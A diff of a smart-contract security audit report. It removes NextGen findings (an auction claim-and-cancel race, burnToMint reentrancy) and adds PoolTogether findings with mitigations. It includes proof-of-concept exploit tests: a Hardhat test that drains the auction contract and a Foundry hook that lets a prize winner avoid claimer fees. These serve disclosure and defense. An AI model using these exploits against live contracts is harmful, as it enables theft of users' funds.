-
-    const auctionEndingTime = await contracts.hhMinter.getAuctionEndTime(auctionTokenId);
-
-    // Get the current time
-    const blockNumber2 = await ethers.provider.getBlockNumber();
-    const block2 = await ethers.provider.getBlock(blockNumber2);
-    const currentTimestamp2 = block2.timestamp;
-
-    const timeDifference = Number(auctionEndingTime) - currentTimestamp2;
-
-    // The auction period is 7 days, and an exact 7 days has been passed.
-    // EX: if the auction ends at `1700324322`, we will make the transaction at timestamp = `1700324322`
-    await network.provider.send("evm_increaseTime", [timeDifference - 1]);
-    await network.provider.send("evm_mine", []);
-
-    /**
-     * --> Now lets see `AuctionDemo` balance
-     * - From auction 1 --> (1 ETH, 2 ETH, 3 ETH) - Total 6 ETH
-     * - From auction 2 --> (3 ETH) = Total 3 ETH
-     * - So the total balance of the `AuctionDemo` is 9 ETH
-     * - When claiming auction 1, the refunds will go to bidder 1 and bidder 2 (-3 ETH)
-     * - transfereing the NFT to the winner
-     * - Transfere the winner bid to the devs (-3 ETH)
-     *
-     * ---> AuctionDemo should not do anything else, and it should contains 3 ETH in balance from teh auction 2
-     *
-     * - What will occuar is that the winner itself will also withdraw his balance (-3 ETH)
-     * - The winner will cancel his bid, after claiming
-     * - So `AuctionDemo` contract will have 0 ETH in claiming the first auction instead of 3 ETH.
-     */
-
-    await claimWithoutPayContract.connect(winner).claimWithoutPay(auctionTokenId, 2);
-    console.log(await claimWithoutPayContract.getAddress());
-
-    claimWithoutPayContractBalance = await ethers.provider.getBalance(
-        await claimWithoutPayContract.getAddress()
-    );
-    console.log(`The balance of the 'ClaimWithoutPay' contract : ${claimWithoutPayContractBalance}`); // 3 ETH
-    console.log(`Owner of auctioned token: ${await contracts.hhCore.ownerOf(auctionTokenId)}`); // 0x84eA74d481Ee0A5332c457a4d796187F6Ba67fEB
-    console.log(`Auction Demo balance; ${await ethers.provider.getBalance(await hhAuction.getAddress())}`); // 0
-});
-});
-```
-
-</details>
-
-#### Tools Used
-Manual Review + Hardhat
-
-#### Recommended Mitigation Steps
-One condition should remove the equal sign, to prevent this kind of thing from happening.
-
-We will update the `AuctionDemo::claimAuction` function and make it available for claiming after the ending period by 1 second.
-```diff
-require(
--   block.timestamp >= minter.getAuctionEndTime(_tokenid) &&
-+   block.timestamp > minter.getAuctionEndTime(_tokenid) &&
-    auctionClaim[_tokenid] == false &&
-    minter.getAuctionStatus(_tokenid) == true
-);
-```
-
-So the person can not cancel the bid at the time of claiming, as they do not overlap at any time.
-
-### Assessed type
-
-Invalid Validation
-
----
----
----
-
-## [M-01] Minting Before burning in `NextGenCore::burnToMint` leads to reentrancy issues
-
-### Lines of code
-
-https://github.com/code-423n4/2023-10-nextgen/blob/08a56bacd286ee52433670f3bb73a0e4a4525dd4/smart-contracts/NextGenCore.sol#L218-L221
-
-### Vulnerability details
-
-#### Impact
-
-In `NextGenCore::burnToMint` function, which is used to mint a token by burning another token, the minting for the new token happens before burning the burned token. The minting is done through `safeMint()` function. So the minter can use the token before burning it in another position, leading to some problems.
-
-The user can reuse the token to mint another token, where the token is not burned yet. But since `burn()` function reverts if the token does not exist, minting more than one token using the same burned token can't occur.
-
-The problem that can occur is that the user can use this token, in an NFT trading platform for example. So it will be listed for sailing without actually being owned by anyone.
-
-Another problem, it can be listed for auction before burning in a public NFT marketplace like Opensea or Rarible, and the auctions and sales will not work, since the token does not even exist.
-
-There are other problems that can happen that we can't predict since you are giving the minter the freedom to use the NFT (burned token) before burning it.
-
-
-#### Proof of Concept
-
-As it's clear in the snipped code the minting is done, then the burning.
-```solidity
-// NextGenCore::burnToMint
-_mintProcessing(mintIndex, ownerOf(_tokenId), tokenData[_tokenId], _mintCollectionID, _saltfun_o);
-
-// burn token
-_burn(_tokenId);
-```
-
-`_mintProcessing()` calls `_safeMint()` function, which is existed in `ERC721`.
-```solidity
-// NextGenCore::_mintProcessing
-function _mintProcessing( ... ) internal {
-tokenData[_mintIndex] = _tokenData;
-collectionAdditionalData[_collectionID].randomizer.calculateTokenHash(_collectionID, _mintIndex, _saltfun_o);
-tokenIdsToCollectionIds[_mintIndex] = _collectionID;
-_safeMint(_recipient, _mintIndex);
-}
-```
-
-`_safeMint()` checks if the receiver is a contract or not, and it fires `onERC721Received` on it.
-```solidity
-// ERC721::_checkOnERC721Received
-if (to.isContract()) {
-try IERC721Receiver(to).onERC721Received(_msgSender(), from, tokenId, data) returns (bytes4 retval) {
-    return retval == IERC721Receiver.onERC721Received.selector;
-} catch (bytes memory reason) { ... }
-} else { ... }
-```
-
-Now the receiver, a smart contract with `onERC721Received` function, can do anything with the NFT with the burned tokenId before burning it.
-```solidity
-contract ReentrancyBurnToMint {
-...
-
-function onERC721Received(address from, address to, uint256 tokenId, bytes memory data) external returns (bytes4) {
-    // Do any thing with the burned token
-    return this.onERC721Received.selector;
-}
-}
-```
-
-
-#### Tools Used
+### Tools Used
 Manual Review
 
-#### Recommended Mitigation Steps
+### Recommended Mitigations
 
-Burn before minting the new token, to make minting the last step. This will secure the protocol from reentrancy before burning the token.
+1. we can subtract the value of shares from `yieldFeeBalance`:
 
+> PrizeVault::claimYieldFeeShares
 ```diff
-// NextGenCore::burnToMint -> if block
-- _mintProcessing(mintIndex, ownerOf(_tokenId), tokenData[_tokenId], _mintCollectionID, _saltfun_o);
+    function claimYieldFeeShares(uint256 _shares) external onlyYieldFeeRecipient {
+        if (_shares == 0) revert MintZeroShares();
 
-// burn token
-_burn(_tokenId);
-burnAmount[_burnCollectionID] = burnAmount[_burnCollectionID] + 1;
+        uint256 _yieldFeeBalance = yieldFeeBalance;
+        if (_shares > _yieldFeeBalance) revert SharesExceedsYieldFeeBalance(_shares, _yieldFeeBalance);
 
-// mint the token in the last step
-+ _mintProcessing(mintIndex, ownerOf(_tokenId), tokenData[_tokenId], _mintCollectionID, _saltfun_o);
+-       yieldFeeBalance -= _yieldFeeBalance;
++       yieldFeeBalance -= _shares;
+
+        _mint(msg.sender, _shares);
+
+        emit ClaimYieldFeeShares(msg.sender, _shares);
+    }
 ```
 
-### Assessed type
+2. Or We can disallow the `yieldFeeRecipent` from claiming part of the prize and mint all fees to him:
 
-Reentrancy
+> PrizeVault::claimYieldFeeShares
+```solidity
+    // The function after modification
+    function claimYieldFeeShares() external onlyYieldFeeRecipient {
+        if (yieldFeeBalance == 0) revert MintZeroShares();
+
+        uint256 _yieldFeeBalance = yieldFeeBalance;
+
+        yieldFeeBalance = 0;
+
+        _mint(msg.sender, _yieldFeeBalance);
+
+        emit ClaimYieldFeeShares(msg.sender, _yieldFeeBalance);
+    }
+```
+
+
+---
+
+## [M-01] The winner can steal claimer receipent, and force him to pay for the gas
+
+### Impact
+When the winner earns his reward he can either claim it himself, or he can let a claimer contract withdraw it on his behaf, and he will pay part of his fees for that. This is as the user will not pay for the gas fees, instead the claimer contract will pay it instead.
+
+The problem here is that the winner can make the claimer pay for the gas of the transaction, without paying the fees that the claimer contract take.
+
+Claimer contracts are allowed for anyone to use them, transfer prizes to winners and claim some fees. where the one who fired the transaction is the one who will pay for the fees, so he deserved that fees.
+
+[pt-v5-claimer/Claimer.sol#L120-L150](https://github.com/GenerationSoftware/pt-v5-claimer/blob/main/src/Claimer.sol#L120-L150)
+```solidity
+  // @audit and one can call the function
+  function claimPrizes( ... ) external returns (uint256 totalFees) {
+    ...
+
+    if (!feeRecipientZeroAddress) {
+      ...
+    }
+
+    return feePerClaim * _claim(_vault, _tier, _winners, _prizeIndices, _feeRecipient, feePerClaim);
+  }
+```
+
+
+As in the function, the function takes winners, and he called set his fees (but it should not exceeds the maxFees which is initialzed in constructor).
+
+Now We know that anyone can transfer winners prizes and claim some fees.
+
+---
+
+Before the prizes are claimed, the winner can initialze a hook before calling the `PoolPrize::claimPrize`, and this is used if the winner want to initialze another address as the receiver of the reward.
+
+The hook parameter is passed by parameters that are used to determine the correct winner (winner address, tier, prizeIndex).
+
+[abstract/Claimable.sol#L85-L95](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/abstract/Claimable.sol#L85-L95)
+```solidity
+    uint24 public constant HOOK_GAS = 150_000;
+
+    ...
+
+    function claimPrize( ... ) external onlyClaimer returns (uint256) {
+        address recipient;
+
+        if (_hooks[_winner].useBeforeClaimPrize) {
+            recipient = _hooks[_winner].implementation.beforeClaimPrize{ gas: HOOK_GAS }(
+                _winner,
+                _tier,
+                _prizeIndex,
+                _reward,
+                _rewardRecipient
+            );
+        } else {
+            recipient = _winner;
+        }
+
+        if (recipient == address(0)) revert ClaimRecipientZeroAddress();
+
+        uint256 prizeTotal = prizePool.claimPrize( ... );
+      
+        ...
+    }
+
+```
+
+But to prevent OOG the gas is limited to 150K.
+
+---
+
+Now What can the user do to make the claimer pay for the transaction, and do not pay any fees is:
+
+- he will make a `beforeClaimPrize` hook
+- In this function, the user will simply claim his reward `Claimer::claimPrizes(...params)` but with settings no fees, and only passing his winning parameters (we got them in the hook).
+- THe winner (attacker) will not do any further interaction to not make the tx go OOG (remember we have only 150k).
+        console2.log("Fees are 10% (10 tokens)");
+        console2.log("=============");
+        console2.log("Simulating the normal Operation (No stealing)");
+        auditor_complete_claim_proccess(false);
+        console2.log("=============");
+        console2.log("Simulating winner steal recipent fees");
+        auditor_complete_claim_proccess(true);
+    }
+
+    function auditor_complete_claim_proccess(bool willSteal) internal {
+        // If tier is 1 we will take the claimer fees and if 0 we will do nothing
+        uint8 tier = willSteal ? 1 : 0;
+
+        Auditor_MockPrizeToken __prizeToken = new Auditor_MockPrizeToken();
+        Auditor_PrizePoolMock __prizePool = new Auditor_PrizePoolMock(address(__prizeToken));
+
+        address __winner = makeAddr("winner");
+        address __claimerRecipent = makeAddr("claimerRecipent");
+
+        // This will be like the `PrizeVault` that has the winner
+        ClaimableWrapper __claimable = new ClaimableWrapper(
+            PrizePool(address(__prizePool)),
+            address(1)
+        );
+
+        // Claimer contract, that can transfer winners rewards
+        __claimer = new Auditor_Claimer(address(__claimable));
+        // Set new Claimer
+        __claimable.setClaimer(address(__claimer));
+
+        VaultHooks memory beforeHookOnly = VaultHooks(true, false, hooks);
+
+        vm.startPrank(__winner);
+        __claimable.setHooks(beforeHookOnly);
+        vm.stopPrank();
+
+        // PrizePool earns 100 tokens from yields, and we picked the winner
+        __prizeToken.mint(address(__prizePool), 100e18);
+
+        address[] memory __winners = new address[](1);
+        __winners[0] = __winner;
+
+        // Claim Prizes by providing `__claimerRecipent`
+        __claimer.claimPrizes(__winners, tier, 10e18, __claimerRecipent);
+
+        console2.log("Winner PrizeTokens:", __prizeToken.balanceOf(__winner) / 1e18, "token");
+        console2.log(
+            "ClaimerRecipent PrizeTokens:",
+            __prizeToken.balanceOf(__claimerRecipent) / 1e18,
+            "token"
+        );
+    }
+  ```
+
+</details>
+
+3. Change [`beforeClaimPrize`](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/test/unit/Claimable.t.sol#L254-L274) hook function, and replace it with the following.
+
+```solidity
+    function beforeClaimPrize(
+        address winner,
+        uint8 tier,
+        uint32 prizeIndex,
+        uint96 reward,
+        address rewardRecipient
+    ) external returns (address) {
+        address[] memory __winners = new address[](1);
+        __winners[0] = winner;
+
+        if (tier == 1) {
+            __claimer.claimPrizes(__winners, 0, 0, rewardRecipient);
+        }
+
+        return winner;
+    }
+```
+
+4. Check that everything is correct and run
+
+```powershell
+forge test --mt testAuditor_winnerStealClaimerFees -vv
+```
+
+**Output**:
+
+```powershell
+  Winner reward is 100 tokens
+  Fees are 10% (10 tokens)
+  =============
+  Simulating the normal Operation (No stealing)
+  Winner PrizeTokens: 90 token
+  ClaimerRecipent PrizeTokens: 10 token
+  =============
+  Simulating winner steal recipent fees
+  Winner PrizeTokens: 100 token
+  ClaimerRecipent PrizeTokens: 0 token
+```
+
+In this test we first made a reward and withdrawed it from out Claimer contract normally (no attack happened), and then we made another prize reward but by making the attack, which is clear in the output
+
+### Tools Used
+Manual Review + Foundry
+
+### Recommended Mitigation Steps
+We can check the prize state before and after the hook and if it changed from unclaimed to claimed, we can revert the transaction.
+
+> Claimable.sol
+```diff
+    function claimPrize( ... ) external onlyClaimer returns (uint256) {
+        address recipient;
+
+        if (_hooks[_winner].useBeforeClaimPrize) {
++           bool isClaimedBefore = prizePool.wasClaimed(address(this), _winner, _tier, _prizeIndex);
+            recipient = _hooks[_winner].implementation.beforeClaimPrize{ gas: HOOK_GAS }( ... );
++           bool isClaimedAfter = prizePool.wasClaimed(address(this), _winner, _tier, _prizeIndex);
+
++           if (isClaimedBefore == false && isClaimedAfter == true) {
++               revert("The Attack Occuared");
++           }
+        } else { ... }
+        ...
+    }
+
+```
+
+_NOTE: We wrote this issue 30min before ending of the contest so we did not checked for the grammar quality nor the words, and the mitigation review may not be the best, or may not work (we did not tested it), Devs should keep this in mind when mitigating this issue._
+
+---
+
+## [M-02] Unchecking for the actual assets withdrawn from the vault can prevent users from withdrawing
+
+When withdrawing assets from `PrizeVault`, the contract assumes that the requested assets for redeeming are the actual assets the contract (PrizeVault) received.
+
+[PrizeVault.sol#L936](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L936)
+```solidity
+    function _withdraw(address _receiver, uint256 _assets) internal {
+        ...
+        if (_assets > _latentAssets) {
+            ...
+            // @audit no checking for the returned value (assets)
+            yieldVault.redeem(_yieldVaultShares, address(this), address(this));
+        }
+        if (_receiver != address(this)) {
+            _asset.transfer(_receiver, _assets);
+        }
+    }
+```
+
+Since the calculations are done by rounding Up asset value when getting shares in `previewWithdraw`, and then rounding Down shares when getting assets, there should not be any 1 wei rounding error.
+
+This will not be the case for all `yieldVaults` supported by `PrizeVault`, where the amount can decrease if there is no enough balance in the vault for example, as that of `Beefy Vaults`.
+
+[BIFI/vaults/BeefyWrapper.sol#L156-L158](https://github.com/beefyfinance/beefy-contracts/blob/master/contracts/BIFI/vaults/BeefyWrapper.sol#L156-L158)
+```solidity
+    function _withdraw( ... ) internal virtual override {
+        ...
+
+        uint balance = IERC20Upgradeable(asset()).balanceOf(address(this));
+        if (assets > balance) {
+            // @audit the assets requested for withdrawal will decrease
+            assets = balance;
+        }
+
+        IERC20Upgradeable(asset()).safeTransfer(receiver, assets);
+
+        emit Withdraw(caller, receiver, owner, assets, shares);
+    }
+```
+
+And ofc if there is a fee on withdrawals, the amount will decrease but this is OOS.
+
+## Recommended Mitigations
+
+Check the returned value of assets transferred after withdrawing, and take suitable action if the value differs from the value requested. And take suitable action like emitting events to let Devs know what problem occurred when this user withdrew.
+
+---
+
+## [L-01] Claiming Yields Fees can be done in `recovery mode` breaks protocol invariants
+
+### Impact
+
+When claiming yieldsFee by the `yieldFeeRecipent`, the function did not check if the vault is `normal state (winning)` or in the `recovery mode (losing)`.
+
+[PrizeVault.sol#L611-L622](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L611-L622)
+```solidity
+    function claimYieldFeeShares(uint256 _shares) external onlyYieldFeeRecipient {
+        if (_shares == 0) revert MintZeroShares();
+
+        uint256 _yieldFeeBalance = yieldFeeBalance;
+        if (_shares > _yieldFeeBalance) revert SharesExceedsYieldFeeBalance(_shares, _yieldFeeBalance);
+
+        yieldFeeBalance -= _yieldFeeBalance;
+
+        // @audit No checking if we are in recovery mode or not before minting
+        _mint(msg.sender, _shares);
+
+        emit ClaimYieldFeeShares(msg.sender, _shares);
+    }
+```
+
+So the yieldFeeReceipent can claim his yields, minting new shares to him even if the protocol is in `recovery mode`.
+
+According to protocol invariants, `no new deposits or mints allowed` in the recovery mode
+
+> README
+>> `Yield Vault has Loss of Funds (recovery mode)`
+>> - no new deposits or mints allowed
+
+So if the protocol is in recovery mode new mints can occur, which is an action the protocol should not perform.
+
+After investigating the case, I found that the other protocol invariants will not affected. Where the `totalDept is determined by totalSupply + yieldFeeBalance`.
+
+[PrizeVault.sol#L790-L792C6](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L790-L792C6)
+```solidity
+    function _totalDebt(uint256 _totalSupply) internal view returns (uint256) {
+        return _totalSupply + yieldFeeBalance;
+    }
+```
+
+So this will not change the calculations of `totalAssets` to the `totalDept` ratio, just invariant breaks, which made me label this issue as MEDIUM not HIGH.
+
+## Proof of Concept
+
+Here is a scenario where this could happen.
+
+- People deposit their money in the `PrizeVault`.
+- The protocol `yieldVault` earns yields.
+- `LiquidationPair` did liquidation (claim yields), and participated in the prize pool.
+- The process occurs again and again and the accumulated fees increase.
+- `yieldVault` losses and the `prizeVault` recovery mode reached (totalAssets < totalDept).
+- The `yieldFeeRecipent` claimed his fees, minting new shares to him in the recovery mode.
+- Protocol invariants broke.
+
+### Tools Used
+Manual Review
+
+### Recommended Mitigation Steps
+Prevent claiming fees if the protocol is in the `recovery mode`.
+
+```diff
+    function claimYieldFeeShares(uint256 _shares) external onlyYieldFeeRecipient {
+        if (_shares == 0) revert MintZeroShares();
+
+        uint256 _yieldFeeBalance = yieldFeeBalance;
+        if (_shares > _yieldFeeBalance) revert SharesExceedsYieldFeeBalance(_shares, _yieldFeeBalance);
+
++       require(totalAssets() >= totalDebt(), "Can't mint shares in recovery mode");
+        yieldFeeBalance -= _yieldFeeBalance;
+
+        _mint(msg.sender, _shares);
+
+        emit ClaimYieldFeeShares(msg.sender, _shares);
+    }
+``` 
+
+---
+
+## [L-02] Checking previous approval before `permit()` is done with strict equality
+
+In `PrizeVault::depositWithPermit`, the check that is implemented by the protocol to overcome griefing users by frontrunning permit signing, is to check if the owner allowance equals or does not equal the assets being transferred.
+
+[PrizeVault.sol#L539-L541](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L539-L541)
+```solidity
+    function depositWithPermit(... ) external returns (uint256) {
+        ...
+
+        // @audit strict check (do not check if the allowance exceeds required)
+        if (_asset.allowance(_owner, address(this)) != _assets) {
+            IERC20Permit(address(_asset)).permit(_owner, address(this), _assets, _deadline, _v, _r, _s);
+        }
+
+        ...
+    }
+``` 
+
+So if the user approval exceeds the amount he wanted to do, the permit still will occur.
+
+- Let's say Bob approved 1000 tokens.
+- Bob wants to transfer 500 tokens.
+- Bob first the function `depositWithPermit()`.
+- (1000 != 500), and Bob will have an allowance of 1500 tokens when he only needs 500.
+
+## Recommended Mitigations
+Allow permit if the allowance is Smaller than the required assets
+
+```diff
+    function depositWithPermit(... ) external returns (uint256) {
+        ...
+
+-       if (_asset.allowance(_owner, address(this)) != _assets) {
++       if (_asset.allowance(_owner, address(this)) < _assets) {
+            IERC20Permit(address(_asset)).permit(_owner, address(this), _assets, _deadline, _v, _r, _s);
+        }
+
+        ...
+    }
+```
+---
+
+## [L-03] No checking for Breefy Vault strategies state (paused or not)
+
+When depositing or minting into a vault, the check that is done by the `ERC4626` is checking the `maxDeposit` parameter.
+
+This function `maxDeposit()` will return 0 if the Vault is in pause state like AAVE-v3 [link](https://github.com/timeless-fi/yield-daddy/blob/main/src/aave-v3/AaveV3ERC4626.sol#L161-L164).
+
+But In case of breefy, when depositing The function go to the internal deposie function first
+
+1. [BIFI/vaults/BeefyWrapper.sol#L117-L130](https://github.com/beefyfinance/beefy-contracts/blob/master/contracts/BIFI/vaults/BeefyWrapper.sol#L117-L130)
+```solidity
+    // BeefyWrapper.sol
+    function _deposit( ... ) internal virtual override {
+        ...
+        // @audit Step 1
+        IVault(vault).deposit(assets);
+
+        ...
+    }
+```
+2. [/BIFI/vaults/BeefyVaultV7.sol#L100-L115](https://github.com/beefyfinance/beefy-contracts/blob/master/contracts/BIFI/vaults/BeefyVaultV7.sol#L100-L115)
+```solidity
+    // BeefyVaultV7.sol
+    function deposit(uint _amount) public nonReentrant {
+        // @audit Step 2
+        strategy.beforeDeposit();
+
+        ...
+    }
+```
+3. [BIFI/strategies/Aave/StrategyAaveSupplyOnlyOptimism.sol#L104-L109](https://github.com/beefyfinance/beefy-contracts/blob/master/contracts/BIFI/strategies/Aave/StrategyAaveSupplyOnlyOptimism.sol#L104-L109)
+```solidity
+    // @audit Step 3
+    // StrategyAaveSupplyOnlyOptimism.sol (We took AAVE Optmism as an example)
+    function beforeDeposit() external override {
+        if (harvestOnDeposit) {
+            require(msg.sender == vault, "!vault");
+            _harvest(tx.origin);
+        }
+    }
+```
+4. [BIFI/strategies/Aave/StrategyAaveSupplyOnlyOptimism.sol#L124-L139](https://github.com/beefyfinance/beefy-contracts/blob/master/contracts/BIFI/strategies/Aave/StrategyAaveSupplyOnlyOptimism.sol#L124-L139)
+```solidity
+    // @audit Step4
+                                         /* ︾ */  
+    function _harvest( ... ) internal whenNotPaused gasThrottle {
+        ...
+    }
+```
+
+So if the Breedy strategy vault is paused, the depositing will revert, and can not occur.
+
+## Recommended Mitigations
+Checking if the vault is paused or not is not directly supported, we need to check the strategy contract itself. However since the beefy wrapper supports more than one Strategy, checking the state may differ from one Strategy to another, but if all Strategies have the same interface, the check can be implemented before depositing.
+
+---
+---
+
+## [NC-01] Assets must precede the shares according to the ERC4626 standard
+
+In the implementation of `PrizeVault::_burnAndWithdraw()`, the function takes shares then it takes the assets parameter at the end. And this is not the way assets and shares are provided to the ERC4626 functions.
+
+[PrizeVault.sol#L887-L893](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L887-L893)
+```solidity
+    function _burnAndWithdraw(
+        address _caller,
+        address _receiver,
+        address _owner,
+        uint256 _shares, // @audit Order should be (_assets, _shares) as that of ERC4626
+        uint256 _assets
+    ) internal {
+        ...
+    }
+```
+
+All functions depositing/minting/withdrawing/redeeming in ERC4626 make the assets parameter first then shares.
+
+### Recommended Mitigations
+Make the assets first, then the shares at the last in `PrizeVault::_burnAndWithdraw()`.
+
+_NOTE: You will have to change all the calling of this function in PrizeVault + testing scripts files_.
